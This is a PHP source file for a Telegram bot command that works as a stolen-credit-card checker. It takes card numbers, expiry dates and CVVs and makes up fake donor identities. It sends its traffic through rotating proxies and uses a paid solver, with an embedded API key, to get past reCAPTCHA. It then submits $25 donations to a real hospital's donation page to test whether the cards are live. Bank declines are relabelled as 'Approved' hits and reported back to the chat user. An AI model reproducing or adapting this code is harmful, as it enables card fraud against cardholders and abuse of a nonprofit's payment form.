<?php
list($cmd) = explode(" ", $message);
if($cmd == "/kd" or $cmd == ".kd" or $cmd == "!kd"){
 $tiempo_inicial = microtime(true);
$NameGater ='Kindom';
$gateway = "/kd $NameGater";
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Braintree 25$</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!kd card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree 25$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();


#------[CURL-2]------#
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree 25$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS! 🟨</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


//////////////////////////////=================[Join @TechHacksBySoham For More Stuff]=================/////////////////////////
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,99933). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = rand(725,480)."-". rand(111,999)."-". rand(1111,9999);
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);


$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$curl = new CurlX;


$retries = 0;


$time_inicial = microtime(true);


if(strlen($ano) == 2){
    $ano = "20".$ano;
}
if(strlen($mes) == 1){
    $mes = "0".$mes;
}

$ccnumber = preg_replace('/^(\d{4})(\d{4})(\d{4})(\d{1,4})$/', '$1+$2+$3+$4', $cc);


 
$cookie = uniqid();
$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

$phone = '360-'.rand(111,999).'-'.rand(1111,9999).'';
$headers = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: es-ES,es;q=0.9',
    'Cache-Control: max-age=0',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://middlesexhealth.org',
    'Referer: https://middlesexhealth.org/donate/make-a-gift',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

$req2 = $curl::Post('https://middlesexhealth.org/donate/make-a-gift', 'donationAmount=25&subscriptionplan=&donationArea=Campaign+for+a+Brighter+Future&donationAreaOther=&dedicationHonoreeName=&dedicationRecipientMessage=&dedicationCount=1&donorPrefix=Mr&donorFirstname='.$firstname.'&donorMiddlename=&donorLastname='.$lastname.'&donorSuffix=&donorCompany=Corp+Funk&donorAddress1='.urlencode($street).'&donorAddress2=&donorCity='.urlencode($city).'&donorStateProvince='.$regioncode.'&donorStateProvinceOther=&donorPostalcode=98501&donorCountry=US&donorPhone='.$phone.'&donorEmail='.urlencode($email).'&creditCardNumber='.$ccnumber.'&creditCardExpirationMonthAndYear='.$mes.'%2F'.$ano.'&creditCardSecurityCode='.$cvv.'&donorComments=&cmd=confirm', $headers, $cookie, $server);



        
$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://middlesexhealth.org/',
      'websiteKey'    => '6Lf32hQTAAAAADMNKpd7zpH0-wRIM3ZY7G1Gckxq',
    ]
);
$captcha = $solution["gRecaptchaResponse"];


$req5 = $curl::Post('https://middlesexhealth.org/donate/make-a-gift',$data = 'DONORADDRESS1='.urlencode($street).'&DONORSUFFIX=&DONORFIRSTNAME='.$firstname.'&RECOGNITIONLISTING=&DEDICATIONHONOREENAME=&DONOREMPLOYERINFO=&DONORMIDDLENAME=&DEDICATIONCOUNT=1&CREDITCARDSECURITYCODE='.$cvv.'&DEDICATIONTYPE=&CREDITCARDNUMBER='.$cc.'&DONORADDRESS2=&DONORCITY='.urlencode($city).'&DONORLASTNAME='.$lastname.'&DONATIONAMOUNT=25&DONORSTATEPROVINCE='.$regioncode.'&DONORPHONE='.$phone.'&DONATIONAREA=Cancer+Center+%28Middletown%2FWestbrook%29&DONORCOUNTRY=US&CREDITCARDEXPIRATIONMONTHANDYEAR='.$mes.'%2F'.$ano.'&DONORCOMMENTS=&SUBSCRIPTIONPLAN=&BMAKEDONATION=1&DONORSTATEPROVINCEOTHER=&DONORCOMPANY=Corp+'.$lastname.'&DEDICATIONRECIPIENTMESSAGE=&DONORPREFIX=&DONORPOSTALCODE='.$zip.'&DONATIONAREAOTHER=&DONOREMAIL='.urlencode($email).'&DEDICATIONISDEDICATEFORSOMEONE=&DONATIONISMONTHLYRECURRENCE=0&g-recaptcha-response='.$captcha.'&formfield1234567893=39980808%2C19745223&formfield1234567894=&cmd=process', $headers = [
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://middlesexhealth.org',
'Referer: https://middlesexhealth.org/donate/make-a-gift',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
] , $cookie,$server );



$base = $curl::ParseString($req5->body, '<h3 class="alert-heading">Please fix the following errors:</h3>', '</li>');
$mgs = trim(strip_tags($curl::ParseString($base, '<li>Other<ul>', '.')));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 2);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree 25$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if($response == "Maximun retries reached (3/3)"){
$status = "Error: Unknown !⚠️";
$response = "Maximun retries reached (3/3)";
}elseif(!substr_count($req5->body, "Please fix the following errors")){
$status = "Approved ✅";
$response = "Charged! 25$";
}elseif(substr_count($req5->body, "CVV2 DECLINED (C2) - THE DECISION TO DENY YOUR CARD IS BASED UPON INFORMATION PROVIDED BY YOUR ISSUING BANK. PLEASE CONTACT YOUR ISSUING BANK FOR ADDITIONAL INFORMATION.")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Gateway Rejected: avs")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Card Issuer Declined CVV")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Insufficient Funds")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "DO NOT HONOR (05) - THE DECISION TO DENY YOUR CARD IS BASED UPON INFORMATION PROVIDED BY YOUR ISSUING BANK")){
$status = "DECLINED!🔴";
$response = "DO NOT HONOR (05) - THE DECISION TO DENY YOUR CARD IS BASED UPON INFORMATION PROVIDED BY YOUR ISSUING BANK";
}elseif(substr_count($response, "")){
$status = "DECLINED!🔴";
$response = "Declined";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "DO NOT HONOR (05) - THE DECISION TO DENY YOUR CARD IS BASED UPON INFORMATION PROVIDED BY YOUR ISSUING BANK";
}



bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree 25$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>